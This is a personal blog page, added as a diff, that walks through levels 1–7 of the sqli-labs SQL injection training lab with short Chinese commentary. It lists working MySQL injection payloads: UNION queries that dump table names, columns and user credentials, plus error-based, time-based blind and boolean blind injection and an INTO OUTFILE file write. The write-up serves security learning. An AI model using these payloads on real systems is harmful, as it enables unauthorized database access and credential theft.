@@ -1,0 +1,236 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>sqli-labs | NaCl1</title>
+<link rel="shortcut icon" href="https://NaCl1.github.io/favicon.ico?v=1704386016631">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://NaCl1.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="sqli-labs | NaCl1 - Atom Feed" href="https://NaCl1.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="Less-1
+?id=-1' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='security'%23..." />
+    <meta name="keywords" content="" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://NaCl1.github.io">
+  <img class="avatar" src="https://NaCl1.github.io/images/avatar.png?v=1704386016631" alt="">
+  </a>
+  <h1 class="site-title">
+    NaCl1
+  </h1>
+  <p class="site-description">
+    温故而知新
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              sqli-labs
+            </h2>
+            <div class="post-info">
+              <span>
+                2023-11-08
+              </span>
+              <span>
+                3 min read
+              </span>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content" v-pre>
+                <h1 id="less-1">Less-1</h1>
+<pre><code>?id=-1' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='security'%23
+</code></pre>
+<p>Your Login name:emails,referers,uagents,users<br>
+Your Password:3<br>
+普通的字符型联合注入</p>
+<pre><code>?id=-1' union select 1,group_concat(column_name),3 from information_schema.columns where table_name='users'%23
+</code></pre>
+<p>Your Login name:USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS,id,username,password,level,id,username,password<br>
+Your Password:3</p>
+<pre><code>?id=-1' union select 1,group_concat(id,username,password),3 from security.users%23
+</code></pre>
+<h1 id="less-2">Less-2</h1>
+<p>和Less-1 几乎相同</p>
+<pre><code>http://sql-labs/Less-1/
+?id=-1' union select 1,2,group_concat(id,username,password) from security.users%23
+</code></pre>
+<h1 id="less-3">Less-3</h1>
+<p>输入: ?id=1'<br>
+........for the right syntax to use near ''1'') LIMIT 0,1' at line 1<br>
+关键在: <code>'  '1'') LIMIT 0,1 '</code><br>
+系统给输入的内容增加了一个<code>')</code></p>
+<pre><code>?id=-1') union select 1,2,database()%23
+</code></pre>
+<p>其余步骤与前几关相同</p>
+<h1 id="less-4">Less-4</h1>
+<p>输入单引号并不报错,而输入双引号会报错<br>
+与Less-3 类似,只不过使用了<code>&quot;)</code>包裹字符</p>
+<pre><code>?id=-1&quot;) union select 1,2,3%23
+</code></pre>
+<h1 id="less-5">Less-5</h1>
+<p>没有回显username,报错注入秒了</p>
+<pre><code>?id=-1' and updatexml(1,concat(0x7e,database(),0x7e),1)%23
+</code></pre>
+<p>看网上还有用group by 双查询注入的</p>
+<h1 id="less-6">Less-6</h1>
+<p>Less-5的单引号闭合改为双引号</p>
+<pre><code>?id=1&quot; and updatexml(1,concat(0x7e,database(),0x7e),1)%23
+</code></pre>
+<p>也可以用extractvalue</p>
+<pre><code>?id=1&quot; and extractvalue(1,concat(0x7e,database()))%23
+</code></pre>
+<pre><code>?id=1&quot; and extractvalue(1,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema=database())))%23
+</code></pre>
+<h1 id="less-7">Less-7</h1>
+<p>这关用<code>(('  '))</code>包裹变量<br>
+测试:</p>
+<pre><code>?id=1')) and sleep(5)%23
+</code></pre>
+<p>这里很明显可以使用时间注入<br>
+不过测试了一下发现布尔盲注也是可以的</p>
+<pre><code>?id=1')) and ascii(substr(database(),1,1))&gt;1%23
+</code></pre>
+<p>不够应该都是非预期,网上还有另一种方法,正是使用提示中的<code>outfile</code><br>
+<strong>文件上传</strong><br>
+需要更改mysql的配置文件,将 secure-file-priv 置为空,即</p>
+<pre><code>secure-file-priv=
+</code></pre>
+<p>之后编写payload:<br>
+1')) union select 1,2,database() into outfile '文件要被保存的路径'%23</p>
+<h1 id="less-8">Less-8</h1>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li><a href="#less-1">Less-1</a></li>
+<li><a href="#less-2">Less-2</a></li>
+<li><a href="#less-3">Less-3</a></li>
+<li><a href="#less-4">Less-4</a></li>
+<li><a href="#less-5">Less-5</a></li>
+<li><a href="#less-6">Less-6</a></li>
+<li><a href="#less-7">Less-7</a></li>
+<li><a href="#less-8">Less-8</a></li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://NaCl1.github.io/post/php-fan-xu-lie-hua-zhi-fast-destruct/">
+              <h3 class="post-title">
+                php反序列化之fast destruct
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
+  <a class="rss" href="https://NaCl1.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
